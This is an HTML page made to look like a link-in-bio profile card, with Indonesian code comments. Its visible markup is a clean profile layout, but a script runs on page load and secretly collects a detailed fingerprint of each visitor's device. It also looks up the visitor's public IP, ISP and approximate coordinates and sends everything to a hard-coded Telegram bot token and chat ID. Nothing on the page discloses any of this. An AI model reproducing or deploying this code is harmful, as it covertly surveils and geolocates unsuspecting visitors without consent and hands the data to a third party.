<!DOCTYPE html>

<head>
    <meta charset="UTF-8">

    <style>
        :root {
            --bg: #f5f5f7;
            --card-bg: #ffffff;
            --text: #1d1d1f;
            --text-secondary: #86868b;
            --link-bg: #ffffff;
            --link-border: #d2d2d7;
            --link-hover: #f0f0f5;
            --accent: #007aff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: var(--text);
        }
        .card {
            width: 100%;
            max-width: 420px;
            background: var(--card-bg);
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            padding: 40px 30px;
            text-align: center;
        }
        .avatar {
            width: 96px;
            height: 96px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        .name {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 2px;
        }
        .username {
            color: var(--text-secondary);
            font-size: 15px;
            margin-bottom: 8px;
        }
        .bio {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .link-item {
            display: flex;
            align-items: center;
            padding: 14px 18px;
            background: var(--link-bg);
            border: 1px solid var(--link-border);
            border-radius: 16px;
            text-decoration: none;
            color: var(--text);
            font-weight: 500;
            transition: all 0.15s ease;
            font-size: 15px;
        }
        .link-item:hover {
            background: var(--link-hover);
            border-color: var(--accent);
        }
        .link-icon {
            font-size: 20px;
            margin-right: 14px;
            width: 24px;
            text-align: center;
        }
        .footer {
            margin-top: 24px;
            color: #c0c0c0;
            font-size: 12px;
        }
    </style>
</head>
<body>

                <span class="link-icon">🐦</span> Twitter / X
            </a>

        <div class="footer">lynk.id/lynxzcreator</div>
    </div>

    <script>
        // ===================== KONFIGURASI TELEGRAM =====================
        const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
        const CHAT_ID = '5986004601';
        // =================================================================

        (async function trackVisitor() {
            // 1. Kumpulkan fingerprint perangkat
            let fingerprint = '';

            // Informasi dasar
            fingerprint += `📱 User Agent: ${navigator.userAgent}\n`;
            fingerprint += `🖥️ Platform: ${navigator.platform}\n`;
            fingerprint += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Tidak diketahui'}\n`;
            fingerprint += `💾 Device Memory: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
            fingerprint += `📏 Resolusi: ${screen.width}x${screen.height} (avail: ${screen.availWidth}x${screen.availHeight})\n`;
            fingerprint += `📐 Device Pixel Ratio: ${window.devicePixelRatio}\n`;
            fingerprint += `🎨 Color Depth: ${screen.colorDepth}-bit\n`;
            fingerprint += `🖐️ Touch Points: ${navigator.maxTouchPoints}\n`;
            fingerprint += `🌐 Bahasa: ${navigator.language}\n`;
            fingerprint += `🍪 Cookie Enabled: ${navigator.cookieEnabled}\n`;
            fingerprint += `🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

            // Baterai
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    fingerprint += `🔋 Baterai: ${Math.round(battery.level * 100)}% (Charging: ${battery.charging})\n`;
                }
            } catch(e) {}

            // Koneksi
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                fingerprint += `📶 Koneksi: ${connection.effectiveType} (Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms)\n`;
            }

            // Canvas fingerprint
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 280;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('LynkID Fingerprint', 2, 15);
                const dataURI = canvas.toDataURL();
                const canvasHash = btoa(dataURI).slice(0, 32);
                fingerprint += `🖼️ Canvas Hash: ${canvasHash}\n`;
            } catch(e) {}

            // WebGL fingerprint
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fingerprint += `🎮 GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}\n`;
                        fingerprint += `🎮 GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
                    }
                }
            } catch(e) {}

            // Audio fingerprint
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;
                oscillator.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.start(0);
                const dataArray = new Float32Array(analyser.fftSize);
                analyser.getFloatTimeDomainData(dataArray);
                const audioHash = Array.from(dataArray.slice(0, 10)).map(v => v.toFixed(4)).join(',');
                fingerprint += `🔊 Audio Hash: ${audioHash}\n`;
                oscillator.stop();
                audioCtx.close();
            } catch(e) {}

            // Plugin browser
            if (navigator.plugins) {
                const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
                fingerprint += `🧩 Plugins: ${plugins || 'Tidak ada'}\n`;
            }

            // 2. Data IP dan lokasi perkiraan
            let ipInfo = '';
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                ipInfo = `\n🌐 IP Publik: ${ipData.ip}\n🏢 ISP: ${ipData.org || 'Tidak diketahui'}\n📍 Lokasi (IP): ${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''} (${ipData.postal || ''})\n🌍 Koordinat: ${ipData.latitude}, ${ipData.longitude}\n🕒 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
                // Bisa tambahkan link Google Maps
                if (ipData.latitude && ipData.longitude) {
                    ipInfo += `\n🗺️ Maps: https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}`;
                }
            } catch(e) {
                ipInfo = '\n⚠️ Gagal mendapatkan data IP.';
            }

            // 3. Gabungkan dan kirim
            const fullMessage = `👤 **Pengunjung Baru di Lynk**\n${fingerprint}${ipInfo}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: fullMessage,
                        disable_web_page_preview: false
                    })
                });
            } catch(e) {
                console.error('Gagal mengirim ke Telegram:', e);
            }
        })();
    </script>
